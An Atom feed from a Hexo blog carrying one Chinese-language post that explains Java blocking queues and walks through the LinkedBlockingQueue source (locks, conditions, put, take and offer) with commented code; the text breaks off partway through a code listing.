<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yiruma</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://someonesometimes.github.io/"/>
  <updated>2017-10-24T11:08:38.123Z</updated>
  <id>https://someonesometimes.github.io/</id>
  
  <author>
    <name>Yiruma</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java阻塞队列学习及LinkedBlockingQueue源码分析</title>
    <link href="https://someonesometimes.github.io/2017/10/23/Java%E9%98%BB%E5%A1%9E%E9%98%9F%E5%88%97%E5%AD%A6%E4%B9%A0%E5%8F%8ALinkedBlockingQueue%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>https://someonesometimes.github.io/2017/10/23/Java阻塞队列学习及LinkedBlockingQueue源码分析/</id>
    <published>2017-10-23T15:41:07.000Z</published>
    <updated>2017-10-24T11:08:38.123Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java阻塞队列"><a href="#Java阻塞队列" class="headerlink" title="Java阻塞队列"></a>Java阻塞队列</h2><p>最近在学习Java的多线程编程，对并发编程的认识也从之前用python写简单多线程程序里对并发代码块上锁，到生产者消费者模型，wait()，notify()，阻塞队列这些概念，那么这里要介绍的阻塞队列是什么呢？</p><p>考虑生产者消费者模型这种情况，在从队列中取元素与拿元素时加锁，但在这种场景下仅加锁是不够的，因为生产者往里面放元素的时候，还要考虑队列有没有满，如果已经满了的话就要wait一直到队列不满的时候再往里面放，消费者也是一样的，从队列里面拿元素的时候还要考虑队列是不是空的，如果是空的就要一直wait到非空的时候。注意这里我们就从加锁操作引出了wait(), notify()两个概念，在并发编程中结合这两个概念可以实现更多更精巧复杂的多线程场景。</p><p>好像扯得有点远，还没有说到我们要介绍的阻塞队列的概念，其实阻塞队列就源自于生产者消费者模型中所涉及到的场景，在多线程下很多场景都要有一些临界资源，这些资源可能被多个线程同时访问，所以就要进行加锁啊，wait()，notify()等操作，其实个人觉得加锁还好，就是将一个对临界资源操作的语句块圈起来就好，但要实现wait，notify操作就有些麻烦了，放东西的时候需要一直判断是不是满了，满了还要wait，然后操作完了后还要记得唤醒各种线程防止死锁等等，如果都自己实现的话就有点太麻烦了，更重要的是容易出错，所以这里就引入了阻塞队列的概念，不是临界资源的操作需要加锁，判满，判空等等各种操作嘛，那好，临界资源你直接用我给你写的类，我在类里面已经对所有需要处理的多线程场景进行了处理，使其变得线程安全了，使用这种类的话，自己完全不需要考虑多线程的线程安全问题，而这种类就是我们要介绍的阻塞队列。</p><a id="more"></a><h2 id="LinkedBlockingQueue源码分析"><a href="#LinkedBlockingQueue源码分析" class="headerlink" title="LinkedBlockingQueue源码分析"></a>LinkedBlockingQueue源码分析</h2><p>还是蛮幸运的，划分分析方向的时候我正好被分到去分析这个类，这个类用的场景还是挺多的，最经典的就是消费者生产者问题，所以在源码分析中我们可以接着结合生产者消费者这个场景来理解</p><h3 id="对LinkedBlockingQueue简单的介绍"><a href="#对LinkedBlockingQueue简单的介绍" class="headerlink" title="对LinkedBlockingQueue简单的介绍"></a>对LinkedBlockingQueue简单的介绍</h3><p>以下摘自Javadoc中的描述</p><blockquote><p> An optionally-bounded {@linkplain BlockingQueue blocking queue} based on<br> linked nodes.<br> This queue orders elements FIFO (first-in-first-out).<br> The <em>head</em> of the queue is that element that has been on the<br> queue the longest time.<br> The <em>tail</em> of the queue is that element that has been on the<br> queue the shortest time. New elements<br> are inserted at the tail of the queue, and the queue retrieval<br> operations obtain elements at the head of the queue.<br> Linked queues typically have higher throughput than array-based queues but<br> less predictable performance in most concurrent applications.</p><p> </p><p>The optional capacity bound constructor argument serves as a<br> way to prevent excessive queue expansion. The capacity, if unspecified,<br> is equal to {@link Integer#MAX_VALUE}.  Linked nodes are<br> dynamically created upon each insertion unless this would bring the<br> queue above capacity.</p></blockquote><p>简单翻译一下：</p><p>这是基于链式表的一个任意长度的队列。这个队列中元素的顺序基于FIFO先进先出的规则，也就是队列里的head元素是最早入队列的元素，队列的tail元素是最晚入队列的元素。新的元素会被插到队列的队尾，并且从队列中取元素的时候取得是队列的head。链式队列相比基于数组的队列具有更好的吞吐量但是在很多并发应用中缺少可预见的性能。</p><p>构造函数的参数中提供可选择的队列容量，则可以阻止队列无限的扩充。关于这个容量参数，如果没有特殊指定的话，就按照Integer类里面的MAX_VALUE值来指定（特意去看了下，那个上限值是0x7fffffff）。链表的节点在插入的时候都是动态生成的除非队列的容量达到了之前指定的上限值</p><h3 id="这种链表队列与我们之前使用的链表有什么不同？"><a href="#这种链表队列与我们之前使用的链表有什么不同？" class="headerlink" title="这种链表队列与我们之前使用的链表有什么不同？"></a>这种链表队列与我们之前使用的链表有什么不同？</h3><p>其实基本都是差不多的啦，我们在链表里能够使用的方法在这个类里面也基本都实现了，只是在实现中需要考虑到如何实现线程安全这一部分的代码。从类的声明中我们可以看到这个类的就是从<code>AbstractQueue&lt;E&gt;</code>中继承的方法，同时实现了阻塞队列<code>BlockingQueue</code>所规定的一些接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedBlockingQueue</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractQueue</span>&lt;<span class="title">E</span>&gt;</span></div><div class="line">        <span class="keyword">implements</span> <span class="title">BlockingQueue</span>&lt;<span class="title">E</span>&gt;, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></div></pre></td></tr></table></figure><h3 id="LinkeBlockingQueue的成员变量以及一些私有方法"><a href="#LinkeBlockingQueue的成员变量以及一些私有方法" class="headerlink" title="LinkeBlockingQueue的成员变量以及一些私有方法"></a>LinkeBlockingQueue的成员变量以及一些私有方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"> <span class="comment">//链表的节点对象定义，每个节点有一个存储元素的变量item，还引用节点类型的变量</span></div><div class="line"> <span class="comment">//next用于指向下一个节点。</span></div><div class="line"> <span class="comment">//构造方法可以为此节点存储的元素item赋值</span></div><div class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">E</span>&gt; </span>&#123;</div><div class="line">    E item;</div><div class="line"></div><div class="line">    Node&lt;E&gt; next;</div><div class="line"></div><div class="line">    Node(E x) &#123; item = x; &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//用于保存链表队列的最大长度，之前的简介里也已经提到过了，如果没有特殊指定的话，就用</span></div><div class="line"><span class="comment">//Integer.MAX_VALUE，也就是0x7fffffff </span></div><div class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> capacity;</div><div class="line"></div><div class="line"><span class="comment">//count代表当前链表中元素的数量。需要特别指出来的是，这里并不是一个简单的int类型，</span></div><div class="line"><span class="comment">//而是用的AtomicIntegerler类型，这是种原子类型，所有的操作都是连续完成的，</span></div><div class="line"><span class="comment">//不会受到干扰，如果不清楚的话，只要知道这个对这个类型的操作是线程安全的就行了。</span></div><div class="line"><span class="comment">//为什么要用这种类型呢，直接用int难道不行？是这样的，LinkedBlockingQueue支持同时</span></div><div class="line"><span class="comment">//往一个队列里面放元素与取元素，这一点马上就会在下面的分析中得到佐证。所以如果能</span></div><div class="line"><span class="comment">//同时存取的话，count值就有可能被同时操作，所以我们要把它设置成原子类型以保证</span></div><div class="line"><span class="comment">//count这个临界资源的线程安全</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">final</span> AtomicInteger count = <span class="keyword">new</span> AtomicInteger();</div><div class="line"></div><div class="line"><span class="comment">//链表的头，也就是取出数据的位置，head节点的item变量是恒为null的，next则指向下一个节点</span></div><div class="line"><span class="keyword">transient</span> Node&lt;E&gt; head;</div><div class="line"></div><div class="line"><span class="comment">//链表的尾节点，也就是添加数据的位置，last节点的next变量是恒为null的，</span></div><div class="line"><span class="comment">//item则存放着最后一个元素，也就是最新进入队列的值</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">transient</span> Node&lt;E&gt; last;</div><div class="line"></div><div class="line"><span class="comment">//此对象在运行take，poll方法的时候需要加的锁，也就是取锁，防止另一个取进程同时进行操作</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">final</span> ReentrantLock takeLock = <span class="keyword">new</span> ReentrantLock();</div><div class="line"></div><div class="line"><span class="comment">//属于取锁takeLock的变量，有await()与signal()方法，用于实现取东西的时候为空所要等待</span></div><div class="line"><span class="comment">//以及取完后唤醒其他取东西进程的两种操作 </span></div><div class="line"><span class="keyword">private</span> <span class="keyword">final</span> Condition notEmpty = takeLock.newCondition();</div><div class="line"></div><div class="line"><span class="comment">//此对象在运行put，offer方法的时候要加的锁，也就是放东西的时候要加上的锁，</span></div><div class="line"><span class="comment">//防止另一个放东西进程同时进行操作这里应该就很明显能够看出来了，在队列中拿东西与</span></div><div class="line"><span class="comment">//放东西使用的是两个不同的锁，所以是支持这两个进程同时操作的</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">final</span> ReentrantLock putLock = <span class="keyword">new</span> ReentrantLock();</div><div class="line"></div><div class="line"><span class="comment">//属于放东西锁的变量，与notEmpty差不多用途，用于实现放东西时队列为满则等待</span></div><div class="line"><span class="comment">//以及放完后再唤醒下其他放东西进程的这两种操作</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">final</span> Condition notFull = putLock.newCondition();</div><div class="line"></div><div class="line"><span class="comment">//其实就相当于notEmpty.signal()，用于在放东西完成后调用来唤醒取东西进程，这里</span></div><div class="line"><span class="comment">//专门写成函数只是因为在调用notEmpty.signal()的时候是要进行takeLock的</span></div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">signalNotEmpty</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">final</span> ReentrantLock takeLock = <span class="keyword">this</span>.takeLock;</div><div class="line">    takeLock.lock();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        notEmpty.signal();</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        takeLock.unlock();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//同理于signalNotEmpty()函数，是在取东西完成后用于唤醒放东西线程用的</span></div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">signalNotFull</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">final</span> ReentrantLock putLock = <span class="keyword">this</span>.putLock;</div><div class="line">    putLock.lock();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        notFull.signal();</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        putLock.unlock();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//最基础的入队列过程，相信在数据结构里面这种操作已经写过无数遍了，因此此处不再叙述</span></div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">enqueue</span><span class="params">(Node&lt;E&gt; node)</span> </span>&#123;</div><div class="line">    <span class="comment">// assert putLock.isHeldByCurrentThread();</span></div><div class="line">    <span class="comment">// assert last.next == null;</span></div><div class="line">    last = last.next = node;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//最基础的出队列过程，同样不再叙述细节</span></div><div class="line"><span class="function"><span class="keyword">private</span> E <span class="title">dequeue</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="comment">// assert takeLock.isHeldByCurrentThread();</span></div><div class="line">    <span class="comment">// assert head.item == null;</span></div><div class="line">    Node&lt;E&gt; h = head;</div><div class="line">    Node&lt;E&gt; first = h.next;</div><div class="line">    h.next = h; <span class="comment">// help GC</span></div><div class="line">    head = first;</div><div class="line">    E x = first.item;</div><div class="line">    first.item = <span class="keyword">null</span>;</div><div class="line">    <span class="keyword">return</span> x;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//这个函数比较有意思，是把拿东西取东西两个都禁止掉，适用于一种什么场景呢？</span></div><div class="line"><span class="comment">//在LinkedBlockedQueue类中还提供了链表中的搜索函数————contains()，</span></div><div class="line"><span class="comment">//移除节点函数————remove()，这些函数在执行的时候，出入队列很显然都是不被允许的，</span></div><div class="line"><span class="comment">//因此就需要加上这种锁 </span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">fullyLock</span><span class="params">()</span> </span>&#123;</div><div class="line">    putLock.lock();</div><div class="line">    takeLock.lock();</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//对应上面的fullyLock()函数</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">fullyUnlock</span><span class="params">()</span> </span>&#123;</div><div class="line">    takeLock.unlock();</div><div class="line">    putLock.unlock();</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="LinkedBlockingQueue提供的public接口"><a href="#LinkedBlockingQueue提供的public接口" class="headerlink" title="LinkedBlockingQueue提供的public接口"></a>LinkedBlockingQueue提供的public接口</h3><p>生产者消费者模型中最重要的就是放东西，取东西这两种操作，里面涉及到了wait，notify各种行为，所以我们先来看这两类接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//这是LinkedBlockingQueue中提供的放东西接口，其实放东西取东西的操作都是</span></div><div class="line"><span class="comment">//差不多的，所以我会把这一个叙述的详细点，其他的函数也就触类旁通了</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(E e)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</div><div class="line"><span class="comment">//如果传入的元素是null的话，直接返回空指针异常    </span></div><div class="line">    <span class="keyword">if</span> (e == <span class="keyword">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</div><div class="line"></div><div class="line">  <span class="comment">//这个c命名为-1，是有自己的意义的，之后的函数也都很常见这个c=-1，那么我</span></div><div class="line">    <span class="comment">//就在这里做统一的描述吧。考虑这样一种场景，在try块里面对c赋值的语句（本函数</span></div><div class="line">  <span class="comment">//就是c = count.getAndIncrement();）前面运行出现错误了，也就是不会执行到</span></div><div class="line">  <span class="comment">//对c赋值这个点，那么在if (c == 0) signalNotEmpty();这个语句里就不会唤醒</span></div><div class="line">  <span class="comment">//那些等待取东西的线程，这就是在最开始将c置为-1的意义。另外推荐去自行分析下</span></div><div class="line">  <span class="comment">//public boolean offer(E e, long timeout, TimeUnit unit)这个函数里面</span></div><div class="line">  <span class="comment">//对c赋值为-1的目的场景，是个很有意思的情况。</span></div><div class="line">    <span class="keyword">int</span> c = -<span class="number">1</span>;</div><div class="line">    Node&lt;E&gt; node = <span class="keyword">new</span> Node&lt;E&gt;(e);</div><div class="line">    <span class="keyword">final</span> ReentrantLock putLock = <span class="keyword">this</span>.putLock;</div><div class="line">    <span class="keyword">final</span> AtomicInteger count = <span class="keyword">this</span>.count;</div><div class="line">  <span class="comment">//可以看到开始加放东西锁了，如果成功等到加上了此锁，接下来的过程中就不会再有</span></div><div class="line">  <span class="comment">//放东西的线程同时执行了</span></div><div class="line">    putLock.lockInterruptibly();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="comment">//在count为满时此线程进入等待状态，一直到有拿东西线程从队列中取出来东西</span></div><div class="line">      <span class="comment">//然后唤醒它为止</span></div><div class="line">        <span class="keyword">while</span> (count.get() == capacity) &#123;</div><div class="line">            notFull.await();</div><div class="line">        &#125;</div><div class="line">      <span class="comment">//执行入队列操作</span></div><div class="line">        enqueue(node);</div><div class="line">      <span class="comment">//更新c的值，让c+1</span></div><div class="line">        c = count.getAndIncrement();</div><div class="line">      <span class="comment">//在成功执行完成放东西进程后就是惯例的唤醒操作啦，尽量唤醒各种线程，</span></div><div class="line">      <span class="comment">//如果唤醒的不全或者忘记唤醒的话就很容易造成死锁，本来只是加锁的话wait与</span></div><div class="line">      <span class="comment">//notify操作都是自动Java自动完成的，但如果你自己使用等待、唤醒函数的话，</span></div><div class="line">      <span class="comment">//就要想着自己唤醒了，不想着的话就可能有的线程一直处于wait状态而产生死锁。</span></div><div class="line">      <span class="comment">//这里我们有两个线程会可能产生wait状态，一个拿线程，一个放东西线程，</span></div><div class="line">      <span class="comment">//所以就需要唤醒两次，下面这一次就是为了唤醒放东西线程，</span></div><div class="line">      <span class="comment">//而之后的signalNotEmpty()就是为了唤醒取东西线程</span></div><div class="line">        <span class="keyword">if</span> (c + <span class="number">1</span> &lt; capacity)</div><div class="line">            notFull.signal();</div><div class="line">    &#125;</div><div class="line">  <span class="comment">//使用finally操作的意义就是无论try块是顺序执行还是中途哪里出现异常，</span></div><div class="line">  <span class="comment">//都会执行这里面的解锁操作。</span></div><div class="line">  <span class="keyword">finally</span> &#123;</div><div class="line">        putLock.unlock();</div><div class="line">    &#125;</div><div class="line">  <span class="comment">//唤醒取东西线程</span></div><div class="line">    <span class="keyword">if</span> (c == <span class="number">0</span>)</div><div class="line">        signalNotEmpty();</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//拿东西线程，其实和取东西线程都是大同小异的，我们可以通过这个函数再复习一遍</span></div><div class="line"><span class="comment">//多线程操作的基本结构</span></div><div class="line"><span class="function"><span class="keyword">public</span> E <span class="title">take</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</div><div class="line">  <span class="comment">//首先定义返回值，用于存储取出来的元素</span></div><div class="line">    E x;</div><div class="line">  <span class="comment">//还是c=-1，用于一些特殊场景</span></div><div class="line">    <span class="keyword">int</span> c = -<span class="number">1</span>;</div><div class="line">    <span class="keyword">final</span> AtomicInteger count = <span class="keyword">this</span>.count;</div><div class="line">    <span class="keyword">final</span> ReentrantLock takeLock = <span class="keyword">this</span>.takeLock;</div><div class="line">  <span class="comment">//然后开始正式操作前加锁</span></div><div class="line">    takeLock.lockInterruptibly();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">      <span class="comment">//如果没有东西可取则等待，一直到被唤醒后接着往下运行</span></div><div class="line">        <span class="keyword">while</span> (count.get() == <span class="number">0</span>) &#123;</div><div class="line">            notEmpty.await();</div><div class="line">        &#125;</div><div class="line">      <span class="comment">//进行经典的出队列操作</span></div><div class="line">        x = dequeue();</div><div class="line">        c = count.getAndDecrement();</div><div class="line">      <span class="comment">//然后开始各种唤醒，这里唤醒的是取东西线程</span></div><div class="line">        <span class="keyword">if</span> (c &gt; <span class="number">1</span>)</div><div class="line">            notEmpty.signal();</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">    <span class="comment">//解锁操作要放在finally块里面</span></div><div class="line">        takeLock.unlock();</div><div class="line">    &#125;</div><div class="line">  <span class="comment">//这里唤醒的是放东西线程</span></div><div class="line">    <span class="keyword">if</span> (c == capacity)</div><div class="line">        signalNotFull();</div><div class="line">    <span class="keyword">return</span> x;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>然后除了上面两个最常用的存放操作外，LinkedBlockingQueue对象还提供了几个其他的存放操作用于一些特殊的场景</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//也是用于入队列操作，与put不同的如果需要等待的话，就直接返回false，如果</span></div><div class="line"><span class="comment">//不需要等待就可以直接操作的话就进行操作，返回true。</span></div><div class="line"><span class="comment">//但其实仔细分析的话，可以发现在一些场景下仍然可能存在等待时间，</span></div><div class="line"><span class="comment">//满时返回false的操作也并一定都是在if </span></div><div class="line"><span class="comment">//(count.get() == capacity) return false;中完成的，看下面的具体实现分析</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">offer</span><span class="params">(E e)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (e == <span class="keyword">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</div><div class="line">    <span class="keyword">final</span> AtomicInteger count = <span class="keyword">this</span>.count;</div><div class="line">  <span class="comment">//如果满的话，就不进行插入操作，返回false</span></div><div class="line">    <span class="keyword">if</span> (count.get() == capacity)</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    <span class="keyword">int</span> c = -<span class="number">1</span>;</div><div class="line">    Node&lt;E&gt; node = <span class="keyword">new</span> Node&lt;E&gt;(e);</div><div class="line">  <span class="comment">//这里进行加锁操作，但要注意的是，因为从判断非空到这里的加锁并不是一个原子操作，</span></div><div class="line">  <span class="comment">//中间可能插入各种进程，因此可能刚前面判断还没满可以放东西，到这里就发现有线程</span></div><div class="line">  <span class="comment">//正在处理它而需要等待加锁，所以在这种情况下仍然可能出现等待的时间，只是</span></div><div class="line">  <span class="comment">//可能时间非常短罢了</span></div><div class="line">    <span class="keyword">final</span> ReentrantLock putLock = <span class="keyword">this</span>.putLock;</div><div class="line">    putLock.lock();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">      <span class="comment">//这里可以看到，为了保证我们的函数能够很快的返回操作能不能插入，所以这里</span></div><div class="line">      <span class="comment">//就不用满时候的wait操作，如果满了的话就直接跳过入队列进程。留意一点，如果</span></div><div class="line">      <span class="comment">//没有执行插入操作的话c的值就不会改变，仍然是-1，这点马上我们会用到</span></div><div class="line">        <span class="keyword">if</span> (count.get() &lt; capacity) &#123;</div><div class="line">            enqueue(node);</div><div class="line">            c = count.getAndIncrement();</div><div class="line">            <span class="keyword">if</span> (c + <span class="number">1</span> &lt; capacity)</div><div class="line">                notFull.signal();</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        putLock.unlock();</div><div class="line">    &#125;</div><div class="line">  <span class="comment">//这里是唤醒操作</span></div><div class="line">    <span class="keyword">if</span> (c == <span class="number">0</span>)</div><div class="line">        signalNotEmpty();</div><div class="line">  <span class="comment">//如果执行了入队操作的话这里的c就不会是空，所以返回true，如果没有执行入队操作</span></div><div class="line">  <span class="comment">//的话，这里的c仍然是-1，返回false，也就是我们提到的返回false的第二种情况</span></div><div class="line">    <span class="keyword">return</span> c &gt;= <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//这个函数可以提供等待的上限时间，在等待时间超时的时候就丢弃本次入队操作而返回false</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">offer</span><span class="params">(E e, <span class="keyword">long</span> timeout, TimeUnit unit)</span></span></div><div class="line">    <span class="keyword">throws</span> InterruptedException &#123;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (e == <span class="keyword">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</div><div class="line">  <span class="comment">//将指定的时间长度转换为毫秒来进行处理</span></div><div class="line">    <span class="keyword">long</span> nanos = unit.toNanos(timeout);</div><div class="line">    <span class="keyword">int</span> c = -<span class="number">1</span>;</div><div class="line">    <span class="keyword">final</span> ReentrantLock putLock = <span class="keyword">this</span>.putLock;</div><div class="line">    <span class="keyword">final</span> AtomicInteger count = <span class="keyword">this</span>.count;</div><div class="line">    putLock.lockInterruptibly();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">while</span> (count.get() == capacity) &#123;</div><div class="line">          <span class="comment">//如果等待的剩余时间小于等于0，那么直接返回</span></div><div class="line">            <span class="keyword">if</span> (nanos &lt;= <span class="number">0</span>)</div><div class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">            nanos = notFull.awaitNanos(nanos);</div><div class="line">        &#125;</div><div class="line">        enqueue(<span class="keyword">new</span> Node&lt;E&gt;(e));</div><div class="line">        c = count.getAndIncrement();</div><div class="line">        <span class="keyword">if</span> (c + <span class="number">1</span> &lt; capacity)</div><div class="line">            notFull.signal();</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        putLock.unlock();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (c == <span class="number">0</span>)</div><div class="line">        signalNotEmpty();</div><div class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div 